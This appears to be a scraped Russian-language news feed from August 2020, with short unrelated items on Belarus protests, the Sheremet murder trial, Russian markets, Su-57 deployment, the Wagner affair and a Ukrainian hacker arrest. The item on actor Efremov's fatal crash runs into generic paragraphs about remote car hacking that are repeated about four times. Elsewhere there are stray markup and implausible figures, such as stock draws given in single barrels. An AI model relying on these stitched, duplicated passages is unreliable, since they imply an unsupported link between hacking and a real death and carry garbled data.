Характерно, что у британской корпорации Cineworld, владеющей более чем 500 кинозалами в США и занимающей второе место по их количеству после AMC, после решения судьи Торрес почти на 50 проц. подскочила стоимость акций на Лондонской фондовой бирже.
Студии, получившие юридическое право приобретать кинозалы, теперь, очевидно, прикидывают их коммерческий потенциал в ковидную эру, с учётом заведомого падения кассовых сборов из-за необходимости посетителям соблюдать социальную дистанцию, что существенно ограничит число продаваемых билетов.
Нынешнюю патовую ситуацию на кинорынке аналитики из Goldman Sachs, которых процитировал сайт Business Insider, описали в начале августа как логический парадокс про «яйцо и курицу». Киностудии не хотят выпускать блокбастеры в прокат, пока открыты лишь единицы кинозалов и не утвержден новый протокол санитарной безопасности для зрителей. А кинотеатры не хотят открываться на полную катушку, пока студии не предложат им новые блокбастеры.
Пока суд да дело, новые гранды кинорынка под сурдинку прибирают к рукам самые знаменитые кинозалы Америки. Так, «Дисней» прикупил отреставрированный кинотеатр El Capitan в Голливуде, где проходят премьеры диснеевских фильмов. Netflix стал новым хозяином престижного киноцентра «Париж» в центре Манхэттена и кинодворца Egyptian в Голливуде.
 
Источники

В Москве у посольства Республике Беларусь задержали Александра Кузнецова (среди активистов известен как «Дядя Саша»). Об этом ОВД-Инфо сообщила сторонница «бессрочного протеста» Анна Лойко.
У Кузнецова диабет, ему не дают воды и не пускают в туалет. Ему вызвали скорую.
9 августа в Беларуси прошли президентские выборы. По данным властей, действующий президент Александр Лукашенко получил около 80% голосов, а оппозиционный кандидат Светлана Тихановская — около 10%. С тех пор возмущенные граждане Беларуси, уверенные в фальсификации результатов, уже более недели протестуют по всей стране.
СМИ передавали, что белорусские правоохранители использовали против протестующих слезоточивый газ, светошумовые гранаты, резиновые пули, водометы. Согласно многочисленным свидетельствам, после задержания многих людей пытали в спецприемниках и отделах полиции. По данным правозащитного центра «Вясна», в больницах Минска находятся десятки пострадавших во время акций. Есть убитые в результате действий силовиков.
 
Источники

Адвокаты подозреваемых в убийстве журналиста Павла Шеремета во вторник, 25 августа, подадут ходатайство о том, чтобы дело по существу рассматривал суд присяжных.
Об этом "Бабелю" в комментарии рассказал адвокат Юлии Кузьменко Тарас Беспалый, пишет RegioNews.
По его словам, это общая позициязащитников всех фигурантов дела.
Адвокат отметил, что закон позволяет, чтобы дело рассматривал суд присяжных в случаях, когда подозреваемым грозит пожизненное лишение свободы — как в случае Антоненко, Кузьменко и Дугарь, ведь им инкриминируют "умышленное убийство опасным для жизни многих лиц способом, совершенное по сговору группой лиц". Уголовный кодекс предусматривает за такое преступление лишение свободы от 10 до 15 лет или пожизненное лишение свободы.
Если коллегия судей удовлетворит это ходатайство, дело будут рассматривать двое судей и трое присяжных. Если же не удовлетворит, а также не вернет обвинительный акт прокурору, то дальше дело будет рассматривать коллегия из трех судей под председательством Оксаны Голуб.
Напомним, что 25 августа в Шевченковском районном суде Киева начнется рассмотрение по существу дела об убийстве журналиста Павла Шеремета. В 13:00 состоится подготовительное заседание.
 
Источники

В Гурьевске без вести пропал 16-летний Даниил Соколов. Подросток ушёл из дома ещё 7 августа, сообщает пресс-служба регионального УМВД.
Приметы: на вид 16-17 лет, рост около 170 см, среднего телосложения, волосы тёмно-русые короткие. Был одет: серая спортивная кофта с капюшоном, синие джинсы. Предположительно может находиться в Гвардейске.
Всех, кому что-либо известно о местонахождении Соколова Даниила, просят сообщить об этом по телефонам: 8 (40151) 3-07-69 (дежурная часть) или 02.
 
Источники

В Западный военный округ для охраны границ направят истребители-"невидимки" Су-57. Меры приняты в ответ на усиление воздушной группировки НАТО. Об этом, ссылаясь на источники в Минобороны России, пишут "Известия" в среду, 19 августа.
Это радикально нарастит возможности авиации ЗВО и сделает возможным быстрое уничтожение самолётов противника в регионе. В НАТО это прекрасно понимают. Создание мощной авиационной группировки блока возле северо-западных рубежей России было военно-политической авантюрой. Создание ответной группировки авиации, которая имеет на порядок большие ударные возможности — вполне логичный шаг нашего руководства. В сочетании с мощными сухопутными силами, особенно в Калининградской области, российская авиационная группировка превратит военный потенциал НАТО в регионе в ничто», — отметил вице-президент Академии геополитических проблем полковник Владимир Анохин.
Отечественные ВКС получат "невидимку" в начале следующего года. Первыми будут шестая армия ВВС и ПВО Западного военного округа. Сейчас производители исполняют контракты на поставку 76 Су-57 для Министерства обороны РФ. Государственные испытания предсерийной партии "невидимок" планируется завершить в этом году.
 
Источники

Мещанский районный суд Москвы оштрафовал четверых участников шествия в память о начале Великой Отечественной войны по статье о нарушении порядка проведения публичного мероприятия (ч. 5 ст. 20.2 КоАП). Об этом «Апология протеста» сообщает в своем телеграм-канале.
Максиму Мошарову, Евгению Мышаеву, Владимиру Юртаеву и Николаю Гуськову назначили штрафы 10 тысяч рублей. Защита намерена обжаловать решения суда.
Ранее адвокат «Апологии протеста» Григорий Червонный добился отмены штрафа одному из участников шествия: Московский городской суд направил дело на новое рассмотрение.
В Москве 22 июня возле проспекта Сахарова и на Мясницкой улице полицейские задержали не менее 65 человек, которые участвовали в массовой прогулке в сторону Кремля для возложения цветов у могилы неизвестного солдата.
В Ленинградской области полиция 20 июня задержала 28 человек, которые приехали возложить цветы к мемориалу павшим на Невском пятачке. Полицейские решили, что собравшиеся у мемориала проводят несогласованную акцию.
13 августа в Барнауле на главу объединения морских пехотинцев составили протокол за то, что он участвовал в возложении цветов к памятному камню в день Военно-морского флота.
18 августа адвокат «Апологии протеста» Александр Передрук добился отмены штрафа за возложение цветов у Конституционного суда в Санкт-Петербурге. Дело отправили на новое рассмотрение.
 
Источники

Российский фондовый рынок растет вслед за зарубежными фондовыми площадками. Индекс МосБиржи подрос на 0,2% - до 3056,54 пунктов, индекс РТС окреп на 0,4%, его значение составило 1316,32 пунктов.
Лидером повышения стали акции Mail.Ru (+4%), "Сбербанк" и&nbsp;Mail.ru Group объявили об&nbsp;инвестициях на&nbsp;условиях равных долей в&nbsp;объёме 12 млрд рублей в&nbsp;СП и&nbsp;на развитие новых направлений.
Бумаги "Сбербанка" (+1,4%) растут в ожидании заседания Набсовет банка, в ходе которого будет осуждаться вопрос по дивидендам. Рынок надеется услышать позитивные сообщения.
Кроме того, рост смогли показать бумаги TCS (+4,3%), "РУСАЛа" (+2,9%), ММК (+2,4%), "РусАгро" (+2,3%), "Яндекса" (+2%), "Юнипро" (+1,8%), "АЛРОСА" (+1,8%), "Распадская" (+1,7%). На отрицательной стороне завершили день акции "Мечела" (ап-3,6%, ао-1,1%), "Селигдара" (-2,5%), QIWI (-2,4%), "Группы ЛСР" (-1,2%), "Норникеля" (-1,1%).
Вслед за падением золота снижение показывают бумаги Petropavlovsk (-2,3%), Polymetal (-1,4%).
В минусе торговались бумаги нефтегазового сектора: "Роснефть" (-1%), "Газпром" (-0,3%), "ЛУКОЙЛ" (-0,2%). Внимание инвесторов сегодня привлекает информация о жалобе нефтяников на повышение налогов. Главы основных нефтяных компаний обратили внимание президента РФ на идеи Минфина, который ищет варианты компенсировать выпавшие из бюджета в 2019 году 200 млрд рублей.
Ведущие мировые индексы находятся вблизи или&nbsp;выше докризисных уровней, что ограничивает потенциал роста рисковых активов. Между тем, не стоит забывать об ухудшении ситуации с&nbsp;пандемией во&nbsp;многих странах и&nbsp;возможном ответе Китая на&nbsp;прессинг со&nbsp;стороны США в&nbsp;высокотехнологической сфере.
Американские индексы растут в ожидании публикации протокола июльского заседания ФРС. Рынок надеется, что регулятор даст комментарии относительно ситуации вокруг восстановления экономики страны после спада, вызванного пандемией коронавируса. В плюсе индексы удерживают и новости о покупке Johnson&Johnson биотехнологической компании Momenta Pharmaceuticals за $6,5 млрд.
Нефтяные цены сегодня снижаются, инвесторы ждут итогов заседания мониторингового комитета ОПЕК+. Давление на&nbsp;спрос на&nbsp;энергоресурсы оказывает еще и неопределенность в&nbsp;отношениях США и&nbsp;Китая. Между тем, вечером были опубликованы данные по запасам сырья в США, которые поддержали укрепление цен на нефти. К настоящему моменту нефть марки Brent торгуется на уровне $45,28 за баррель, за "бочку" Light дают $42,96.
Сегодняшний день для рубля был весьма волатильным. Днем российская валюта показала снижение к доллару и евро. Но на вечерней сессии рубль смог показать свою крепость, опираясь на данные о снижении запасов сырой нефти в США на 2,67 баррелей, о сокращении запасов бензина на 1,057 тысяч баррелей и падении запасов дистилятов на 0,557 &nbsp;тысяч баррелей. На вечерней сессии курс доллара составил 73,18 рублей, европейская валюта — 86,94 рублей.
К вечеру появились новости о приостановке или&nbsp;прекращении действия трех двусторонних соглашений между США и Гонконгом. "Мы уведомили власти Гонконга 19 августа о&nbsp;приостановке или&nbsp;прекращении действия трех двусторонних соглашений. Эти соглашения покрывали передачу скрывающихся от&nbsp;правосудия преступников, перевод приговоренных лиц и&nbsp;зеркальные налоговые вычеты на&nbsp;доходы, полученные от&nbsp;международных морских перевозок",&nbsp;- сказано в&nbsp;заявлении официального представителя Госдепартамента Моргана Ортагуса. Завтра эти новости могут оказать негативное влияние на развивающиеся рынки, в том числе и на российский рынок.
 
Источники

Обращение к президенту, кабмину и Верховной Раде относительно отмены игорного бизнеса подготовили в городском совете Житомира.
Об этом пишет RegioNews со ссылкой на Первый Житомирский информационный портал.
 
Также в городском совете обеспокоены тем, что власть города фактически не имеет никакого влияния на размещение или деятельность игровых заведений:
 
Депутаты будут просить у высшего руководства законодательного запрета игорного бизнеса в Украине.
Напомним, 13 августа на территории Тернопольской области запретили работу казино.
 
Источники

Госсекретарь США Майк Помпео в среду объявил о выделении дополнительной гуманитарной помощи Ираку в размере 204 миллионов долларов. Эти средства призваны помочь иракскому народу, иракским беженцам в регионе и тем общинам, которые их принимают.
Как пояснил Помпео, эта сумма включает почти 133 миллиона долларов от Бюро по вопросам народонаселения, беженцев и миграции Госдепартамента и более 71 миллиона долларов от Бюро гуманитарной помощи USAID. С учетом этой суммы гуманитарная помощь Ираку, выделенная США с начала 2019 финансового года, превысила 706 миллионов долларов. Кроме того, Соединенные Штаты предоставили 49,5 миллиона долларов в качестве помощи в борьбе с коронавирусом в Ираке и более 22,7 миллиона долларов на оказание помощи сирийским беженцам в Ираке.
По словам госсекретаря, эти средства помогут обеспечить жилье, необходимую медицинскую помощь, экстренную продовольственную помощь, а также услуги водоснабжения, санитарии и гигиены по всему Ираку. Это также улучшит доступ к гражданской документации и юридическим услугам, расширит возможности медицинских учреждений и расширит доступ к образованию и возможностям получения средств к существованию.
«Соединенные Штаты остаются крупнейшим донором гуманитарной помощи в Ираке и во всем мире, в соответствии с нашей Стратегией национальной безопасности, – отметил Помпео. – Мы ценим всех доноров, которые активизировали свои усилия, и продолжаем призывать как традиционных, так и новых доноров помочь удовлетворить растущие потребности».
 
Источники

Над Южной Америкой и юго-западной Африкой зафиксировано расширение гигантской области с разряженным магнитным полем. Об этом сообщается на сайте NASA.
Магнитное поле Земли — своего рода щит, который отражает от планеты заряженные солнечные частицы, напомнили в агентстве. Обнаруженная "вмятина" позволяет опасному потоку проникать к поверхности Земли ближе, чем обычно. Из-за радиации, которую излучают частицы, могут отказывать бортовые компьютеры спутников и приборы на космических аппаратах, собирающих данные.
По мнению учёных, причин возникновения аномалии минимум две. Первая —наклон оси планеты, вторая — расплавленный металл внутри внешнего ядра земного шара. Там, где зафиксирована магнитная "дыра", расположены огромные залежи плотных пород на глубине около 3 тыс. км. Из-за области с низкой скоростью сдвига нарушается генерация магнитного поля, а усугубляется аномалия наклоном планеты.
"Брешь" в магнитном поле Земли смещается на северо-запад. Учёные не исключают, что она может разделиться на две части с отдельным центром минимальной магнитной интенсивности у каждой.
 
Источники

В центре Черняховска открылся духовно-просветительский центр "Преображение". Церемония прошла в среду, 19 августа.
В здании разместят детские и взрослые студии, службы поддержки многодетных семей, военно-патриотические и технические клубы. В центре будут проводить экскурсионно-паломнические мероприятия.
Ранее здесь располагался Дома пионеров, закрытый в 1997 году. После объект не использовался и разрушался. В 2010 недвижимость передали Калининградской епархии, в 2018 — Черняховской. К тому моменту здание находилось в аварийном состоянии.
Чтобы провести ремонт, была подана заявка в Федеральное агентство по делам национальностей, занимающемуся этнокультурным развитием и созданием аналогичных центров в сотрудничестве с общинами и традиционными конфессиями. В мае 2019 года работы начались, капремонт закончился в декабре 2019 года.
 
Источники

Президент посетит ключевые города, где представит кандидатов на должность мэров от партии «Слуга народа» на предстоящих местных выборах.
Об этом « Стране » сообщили источники в Офисе президента, передает RegioNews.
 
Напомним, сегодня Владимир Зеленский лично представил кандидата в мэры Запорожья.
Завтра президент будет представлять «Зе-команду» на местных выборах на Херсонщине.
 
Источники

Счётная палата России выявила в 2020 году бюджетные нарушения на 50 млрд рублей, сообщил глава ведомства Алексей Кудрин на встрече с президентом Владимиром Путиным. Он отметил, что в этом году всего было проведено 169 проверок, половина из которых связана с бюджетом.
«Вскрыто 20 нарушений, которые требуют правовой оценки Генеральной прокуратуры и Следственного комитета, документы отправлены. Представлено 131 представление Счетной палаты по нарушениям министерств и ведомств. Около 50 миллиардов рублей — это нарушения, нецелевое использование бюджетных средств, нарушение бухгалтерского учета, неправильное отражение объектов и расходов в бухгалтерской отчетности, нарушение процедур государственных закупок», — пояснил Кудрин.
Председатель Счетной палаты также отметил, что ведомство проверяет и расходы, связанные с пандемией. «Мы проверяем закупки аппаратов искусственного дыхания, бесконтактных термометров и другого оборудования. Большие средства выделены на поддержку экономики. Как правило, это было быстро, очень упрощенные процедуры. Сейчас, скорее, к концу года, выходим на анализ того, как использовались эти средства, все ли процедуры были использованы. Таким образом, мы тоже сейчас связаны со здравоохранением и с поддержкой экономики», — сказал Алексей Кудрин.
 
Источники

Московский городской суд оставил в силе штрафы в тысячу рублей в отношении трех участников протестов против строительства Юго-Восточной хорды. Александру Ростовскому, Вадиму Белотелову и Павлу Бухштабу вменяли статью о неповиновении законному требованию сотрудника полиции (ст. 19.3 КоАП). Их защищала юрист ОВД-Инфо Дарья Аксёнова.
19 марта 2020 года Буимова, Ефанова, Каменского и еще 60 человек задержали у железнодорожной платформы «Москворечье». Экологические активисты выступали против строительства Юго-Восточной хорды на территории радиоактивного могильника. По следам протестов правоохранители возбудили уголовное дело о порче имущества ФГУП «Радон», которое занимается радиационным контролем, изъятием и транспортировкой радиационных отходов с места строительства.
 
Источники

Индекс цен производителей на входе (PPI input) в Великобритании в июле увеличился в месячном исчислении на 1.8% при ожидавшихся 1.1%; в годовом исчислении снижение индекса составило 5.7%, прогнозировалось 6.1%.
Индекс цен производителей на выходе (PPI output) в июле повысился в месячном исчислении на 0.3% при ожидавшихся 0.2%; в годовом исчислении индекс в соответствии с прогнозами снизился на 0.9%.
 
Источники

]]
Российский истребитель Су-27 в среду поднялся в воздух для перехвата цели, приближавшейся к государственной границе над Балтийским морем. Об этом со ссылкой на Национальный центр управления обороной России сообщает ТАСС 19 августа.
Цель была обнаружена средствами контроля воздушного пространства. Су-27 опознал объект как американский самолёт-разведчик RC-135. После того как иностранное воздушное судно развернулось прочь, российский истребитель вернулся на базу.
В Центре подчеркнули, что американский самолёт российскую госграницу не нарушил. Лётчик Су-27 также соблюдал международные правила использования воздушного пространства.
 
Источники

Виктор Евдокимов представит пропрезидентскую партию на выборах мэра Житомира осенью.
Об этом на своей странице в Facebook сообщил Житомирский центр "Слуги народа".
 
 
Справка: В 2003 году Виктор Евдокимов окончил Житомирский инженерно-технологический институт по специальности "Учет и аудит".
В 2011 году получил научную степень доктора экономических наук по специальности "Бухгалтерский учет, анализ и аудит (за видами экономической деятельности)".
Является ассоциированным членом Института финансовых бухгалтеров Великобритании (IFA). В течение 2016-2017 годов проходил обучение и получил сертификаты Института финансовых бухгалтеров Великобритании (IFA) по курсу "Стратегический менеджмент", "Внутренний аудит", "Международные стандарты финансовой отчетности", "Финансовый менеджмент", "Профессиональная этика".
За весомый личный вклад в обеспечении реализации государственной политики в сфере профессионального обучения государственных служащих награжден Грамотой Национального агентства по вопросам государственной службы Украины (2018 г.). Указом Президента Украины Виктору Евдокимову присвоено почетное звание "Заслуженный деятель науки и техники Украины"
Напомним, сегодня же Владимир Зеленский представил кандидата в мэры Запорожья.
 
Источники

По версии следствия, 8 июня 2020 года актер Михаил Ефремов за рулем Jeep Grand Cherokee выехал на встречную полосу и столкнулся с развозным фургоном на базе Lada Granta. Водитель-курьер Сергей Захаров получил множественные травмы, он скончался в больнице через несколько часов после аварии. 
 
 В последнее время в автомобилях находят множество различных уязвимостей, которые позволяют удаленно перехватить управление и вызвать аварию. 
 Например, недавнее исследование автомобилей популярных марок показало возможность удаленного управления некоторыми функциями двигателя. Эксперты выяснили, что информационно-развлекательная система подключена к трем отдельным шинам, в том числе к трансмиссии. По словам исследователей, в теории, благодаря этому злоумышленники могут получить доступ к управлению двигателем.
 
 Специалисты из подразделения Tencent Keen Security Lab обнаружили уязвимости в автомобилях Lexus и Toyota. В ходе анализа системы AVN (аудио, видео и навигации) в Lexus NX300 2017 года были выявлены проблемы, связанные с функциями Bluetooth и диагностики автомобиля. В ходе эксперимента исследователи смогли удаленно перехватить контроль над устройством AVN без участия пользователя, а затем ввести вредоносные сообщения в CAN, чтобы заставить автомобиль выполнять «физические действия»
 
 В 2011 году хакеры продемонстрировали возможност ь взлома автомобилей с помощью удаленного управления и телеметрических систем, таких как BMW Assist, GM OnStar, Ford Sync, и Hyundai Blue Link. Эти системы связываются с удаленными серверами производителей автомобилей через стандартные каналы связи, например, GSM и CDMA.
 
 Обнаруженная уязвимость в популярных телематических систем для автомобилей ставила под угрозу десятки тысяч машин. Уязвимость (CVE-2019-9493) была обнаружена в системе MyCar производства канадской компании Automobility Distribution. Согласно уведомлению безопасности, опубликованному Координационным центром CERT Университета Карнеги-Меллон (США), любой желающий мог извлечь логин и пароль из исходного кода приложения и с их помощью получить контроль над подключенным автомобилем.
В последнее время в автомобилях находят множество различных уязвимостей, которые позволяют удаленно перехватить управление и вызвать аварию. 
 
 Например, недавнее исследование автомобилей популярных марок показало возможность удаленного управления некоторыми функциями двигателя. Эксперты выяснили, что информационно-развлекательная система подключена к трем отдельным шинам, в том числе к трансмиссии. По словам исследователей, в теории, благодаря этому злоумышленники могут получить доступ к управлению двигателем.
 
 Специалисты из подразделения Tencent Keen Security Lab обнаружили уязвимости в автомобилях Lexus и Toyota. В ходе анализа системы AVN (аудио, видео и навигации) в Lexus NX300 2017 года были выявлены проблемы, связанные с функциями Bluetooth и диагностики автомобиля. В ходе эксперимента исследователи смогли удаленно перехватить контроль над устройством AVN без участия пользователя, а затем ввести вредоносные сообщения в CAN, чтобы заставить автомобиль выполнять «физические действия»
 
 В 2011 году хакеры продемонстрировали возможност ь взлома автомобилей с помощью удаленного управления и телеметрических систем, таких как BMW Assist, GM OnStar, Ford Sync, и Hyundai Blue Link. Эти системы связываются с удаленными серверами производителей автомобилей через стандартные каналы связи, например, GSM и CDMA.
 
 Обнаруженная уязвимость в популярных телематических систем для автомобилей ставила под угрозу десятки тысяч машин. Уязвимость (CVE-2019-9493) была обнаружена в системе MyCar производства канадской компании Automobility Distribution. Согласно уведомлению безопасности, опубликованному Координационным центром CERT Университета Карнеги-Меллон (США), любой желающий мог извлечь логин и пароль из исходного кода приложения и с их помощью получить контроль над подключенным автомобилем.
Например, недавнее исследование автомобилей популярных марок показало возможность удаленного управления некоторыми функциями двигателя. Эксперты выяснили, что информационно-развлекательная система подключена к трем отдельным шинам, в том числе к трансмиссии. По словам исследователей, в теории, благодаря этому злоумышленники могут получить доступ к управлению двигателем.
 
 Специалисты из подразделения Tencent Keen Security Lab обнаружили уязвимости в автомобилях Lexus и Toyota. В ходе анализа системы AVN (аудио, видео и навигации) в Lexus NX300 2017 года были выявлены проблемы, связанные с функциями Bluetooth и диагностики автомобиля. В ходе эксперимента исследователи смогли удаленно перехватить контроль над устройством AVN без участия пользователя, а затем ввести вредоносные сообщения в CAN, чтобы заставить автомобиль выполнять «физические действия»
 
 
 В 2011 году хакеры продемонстрировали возможност ь взлома автомобилей с помощью удаленного управления и телеметрических систем, таких как BMW Assist, GM OnStar, Ford Sync, и Hyundai Blue Link. Эти системы связываются с удаленными серверами производителей автомобилей через стандартные каналы связи, например, GSM и CDMA.
 
 
 Обнаруженная уязвимость в популярных телематических систем для автомобилей ставила под угрозу десятки тысяч машин. Уязвимость (CVE-2019-9493) была обнаружена в системе MyCar производства канадской компании Automobility Distribution. Согласно уведомлению безопасности, опубликованному Координационным центром CERT Университета Карнеги-Меллон (США), любой желающий мог извлечь логин и пароль из исходного кода приложения и с их помощью получить контроль над подключенным автомобилем.
Специалисты из подразделения Tencent Keen Security Lab обнаружили уязвимости в автомобилях Lexus и Toyota. В ходе анализа системы AVN (аудио, видео и навигации) в Lexus NX300 2017 года были выявлены проблемы, связанные с функциями Bluetooth и диагностики автомобиля. В ходе эксперимента исследователи смогли удаленно перехватить контроль над устройством AVN без участия пользователя, а затем ввести вредоносные сообщения в CAN, чтобы заставить автомобиль выполнять «физические действия»
В 2011 году хакеры продемонстрировали возможност ь взлома автомобилей с помощью удаленного управления и телеметрических систем, таких как BMW Assist, GM OnStar, Ford Sync, и Hyundai Blue Link. Эти системы связываются с удаленными серверами производителей автомобилей через стандартные каналы связи, например, GSM и CDMA.
Обнаруженная уязвимость в популярных телематических систем для автомобилей ставила под угрозу десятки тысяч машин. Уязвимость (CVE-2019-9493) была обнаружена в системе MyCar производства канадской компании Automobility Distribution. Согласно уведомлению безопасности, опубликованному Координационным центром CERT Университета Карнеги-Меллон (США), любой желающий мог извлечь логин и пароль из исходного кода приложения и с их помощью получить контроль над подключенным автомобилем.
 
Источники

В четверг, 20 августа, '''"Черкизово"''' опубликует отчетность по МСФО за 2 квартал и 1 полугодие 2020 года. Чистая прибыль группы за 2 квартал 2019 года понизилась до 2,2 млрд рублей, в 1 полугодии показатель сократился до 5,4 млрд рублей.
'''"Газпром нефть"''' завтра также отчитается за 1 полугодие 2020 года по МСФО. Выручка "Газпром нефти" за 6 месяцев 2019 года составила 1,2 трлн рублей, показатель вырос на 6,8% по сравнению с аналогичным периодом прошлого года. Чистая прибыль, относящаяся к акционерам, составила 215 млрд рублей, увеличившись на 29,2%.
В четверг совет директоров '''"Распадской"''' утвердит рекомендации внеочередному общему собранию акционеров по размеру дивидендов по акциям компании по результатам 1 полугодия 2020 года и порядку их выплаты.
Совет директоров''' "РуссНефти"''' завтра также рассмотрит рекомендации годовому общему собранию акционеров по распределению прибыли, в том числе на дивиденды.
Совет директоров '''"РусГидро"''' рассмотрит вопрос об участии и о прекращении участия общества в других организациях.
 
Источники

Служба безопасности Украины не комментирует слухи о причастности к так называемой «вагнеровской спецоперации». Об этом говорится в официальном заявлении СБУ 19 августа в ответ на появившиеся в украинской прессе сообщения о срыве спецоперации по доставке боевиков «ЧВК Вагнера» из Беларуси в Украину.
«Служба безопасности не комментирует слухи, не поддерживает медийно-информационные операции врага и не участвует в публичном обсуждении различных фантастических сценариев. Тем более, когда такой информационный «вброс» нацелен на нанесения вреда Украине», – говорится на странице СБУ в Фейсбуке.
Информацию о «вагнеровской спецоперации», о которой писала украинская пресса, цитируя собственные источники, в СБУ называют «обычным фейком».
«А его первоисточником, подчеркиваем, больше недели назад было именно российское издание. […] Мы понимаем, что инициаторы таких информационных «вбросов» действуют по логике "несколько раз пересказанная ложь может кому-то показаться правдой"», – отмечают в СБУ.
На интернет-сайте Службы внешней разведки Украины отмечается, что специальная информационная операция о так называемой «группе Вагнера в Беларуси» имеет российское происхождение для – «дестабилизации ситуации в Беларуси накануне и во время президентских выборов, […] дискредитации руководства государства Украина с целью снижения рейтинга власти накануне местных выборов».
Глава Офиса президента Украины Андрей Ермак считает информацию о якобы подготовке украинскими спецслужбами операции по задержанию боевиков ЧВК Вагнера, которая была сорвана из-за вероятной утечки информации после совещания у главы государства, спланированной дезинформационной кампанией.
Об этом он заявил 19 августа в комментарии изданию «Лівий берег».
«Однако очевидно, что версия об участии украинских спецслужб в появлении российских боевиков-наемников в Беларуси накануне выборов появилась не в Украине, а в российских СМИ, а именно – в российской «Комсомольской правде» 6 августа. Это выглядит как хорошо продуманная и спланированная дезинформационная кампания. И очень удивляет, что некоторые украинские граждане публично распространяют именно эту версию событий», – сказал Андрей Ермак.
История «вагнеровской операции»
В статье главного редактора портала censor.net.ua Юрия Бутусова 18 августа было помещено сообщение о том, что секретную операцию Службы безопасности и Главного управления разведки Минобороны Украины по задержанию наемников ЧВК «Вагнер провалили из-за утечки информации из Украины.
В статье утверждалось, что «произошла преднамеренная утечка информации, с целью привлечь внимание спецслужб Беларуси к террористам, чтобы спровоцировать их задержание и расшифровку целей их полета».
В тексте сообщалось о плане, который позволил бы схватить террористов, вылетавших рейсом Минск – Стамбул: «самолет по определенным причинам приземлился бы в Украине, террористы были бы задержаны, а пассажиры и экипаж смогли бы быстро продолжить полет».
Приводится также информация, что в ходе вербовки наемников они дали подробные показания на видео о своих преступлениях на территории Украины.
«Но в скандале оказалось замешано высшее руководство страны. Начальник Главного управления разведки Минобороны Василий Бурба, который потребовал проверить на полиграфе главу Офиса президента Андрея Ермака и первого заместителя секретаря СНБО Руслана Демченко, сразу после своего заявления был… уволен указом Зеленского!» – говорится в статье Юрия Бутусова на сайте censor.net.ua
Напомним, что 29 июля 2020 года под Минском задержали 33 наемников из «ЧВК Вагнера». Украина потребовала от Минска рассмотреть возможность передачи группы задержанных боевиков, часть из которых могла быть причастной к войне на Донбассе. По данным российской прессы, 14 августа «вагнеровцы» были переданы России.
О «мифической спецоперации»
Политолог Александр Харебин считает, что невозможно давать объективную оценку процессам подобного стратегического уровня, руководствуясь только лишь сообщениями в прессе или эмоциями многочисленных «лидеров общественного мнения».
«Поэтому делать выводы о возможном факте предательства в Офисе президента Украины, утечке сверхсекретной информации либо же проведенной операции прикрытия в результате провала спецслужб РФ, не будучи главой Службы внешней разведки или СБУ, как минимум, непрофессионально», – сказал Александр Харебин корреспонденту Русской службы «Голоса Америки».
При этом он считает, что, «анализируя все сопутствующие факторы, можно уверенно констатировать успешно проведенную информационно-психологическую спецоперацию со стороны спецслужб России».
«Прежде всего, это перенос внимания и ответственности России по факту присутствия боевиков ЧВК Вагнера на территории Беларуси на мифическую спецоперацию украинских спецслужб на территории соседней страны», – подчеркивает Харебин.
«Следующая решенная задача – это обвинение в государственной измене главы Офиса президента – доверенного человека, призванного обеспечить периметр безопасности для президентской четы, что в свою очередь ставит перед президентом Украины болезненные вопросы лояльности, личной безопасности и устойчивости всей президентской вертикали», – отмечает эксперт.
Еще одна задача подобного информационного вброса, по его словам, – это интенсивная подпитка радикальных настроений у патриотической части украинского электората, оппозиционно настроенной к действующей власти.
Спецоперация – правда или нет
Политолог Олеся Яхно-Белковская отмечает, что на подобные информационные расследования власть должна реагировать оперативнее, выражая единую позицию разных ведомств.
«Мы не знаем достоверно, как было – кто-то поменял свое мнение, кто-то слил информацию, и на этом спецоперация закончилась. Но есть официальная позиция разведки минобороны, что не было никакой спецоперации, есть заявление Ермака – но мы все равно не знаем, верить в это или нет. Когда возникают такие ситуации, реакция власти должна быть немного другой – более оперативной, быть четкой и понятной», – убеждена Олеся Яхно-Белковская.
Вместе с тем она отмечает, что некоторые вопросы к заявлениям со стороны власти все же остались.
«Если это правда, что сказано в статье на Цензор.net, то получается, что одно ведомство делает работу, а другое ведомство может взять и обнулить решение. Если решение принимается, оно доводится до конца, и оно не должно меняться. Если, сказанное неправда и никакой спецоперации не было, то это должно говориться быстрее», – отмечает Яхно-Белковская.
Ветеран СБУ о фейках и «утечке» информации
Информация в прессе о якобы сорванной спецоперации по задержанию «вагнеровцев» выглядит как фейк в силу ряда несоответствий и явной утопичности. Об этом 19 августа в комментарии Украинской службе Радио Свобода заявил бывший заместитель главы СБУ Александр Скипальский.
«Исходя из моего практического опыта, это является фейком. Это подтверждается тем, что такая спецоперация вряд ли могла быть проведена: ее план выглядит как малореальный и утопический. Представьте, что люди, которые работают под контролем высшего руководства российского государства и его специальных органов, поверят в подобную приманку какого-то мифического агента, которого подставила им Служба безопасности Украины», – приводит Радио Свобода слова ветерана СБУ.
По мнению Скипальского, «это...пропагандистская утка, запущенная с целью углубить противостояние и скомпрометировать украинские спецслужбы».
 
Источники

Спецоперацию проводили кіберфахівці Службы безопасности Украины совместно с кіберпідрозділом Городской полиции Лондона и Национальным агентством по борьбе с преступностью Великобритании.
Об этом пишет RegioNews со ссылкой на СБУ.
В ведомстве отметили, что оперативники СБУ получили от британских партнеров информацию, что один из участников группировки проживает в Украине.
Хакер разрабатывал и продавал вирусные программы для кражи логинов и паролей от сайтов, электронных почтовых ящиков, данных кредитных карточек и электронных кошельков. В дальнейшем похищенная информация использовалась для создания бот-сетей, DDoS-атак, похищения денежных средств и персональной информации граждан.
Во время обысков у хакера было изъято более 20 терабайт информации с базами данных с компьютеров, которые было сломано, а также исходные коды разработанного им вируса. Ему уже сообщено о подозрении в совершении уголовного преступления.
 
Напомним, сегодня СНБО заявила, что Россия готовит масштабные кибератаки на Украину ко Дню Независимости.
 
Источники

В среду власти Германии заявили, что многочисленные нападения на мотоциклистов на берлинском шоссе могли иметь религиозные мотивы.
«Нельзя исключать нападение исламистов», – говорится в совместном заявлении берлинской полиции и прокуратуры.
Во вторник 30-летний подозреваемый, который, по словам властей, является гражданином Ирака, врезался на автомобиле в несколько мотоциклов. В результате нападения, которое произошло в час пик, пострадали шесть человек, трое из которых получили тяжелые травмы. Один из пострадавших находится в опасном для жизни состоянии.
По словам полиции, после третьей аварии подозреваемый вышел из своего черного Opel Astra и положил на крышу своего автомобиля ящик для боеприпасов, заявив, что там находится взрывчатка. Когда специалисты открыли ящик струей воды, они обнаружили внутри только инструменты.
Подозреваемый был взят под стражу и допрошен. Местные СМИ идентифицируют его как Сармада Д. В среду он предстал перед судом по трем делам о покушении на убийство.
«Заявления обвиняемого после его действий предполагают религиозно-исламистскую мотивацию, – говорится в заявлении властей Германии. – Есть также признаки психологической нестабильности».
 
Источники

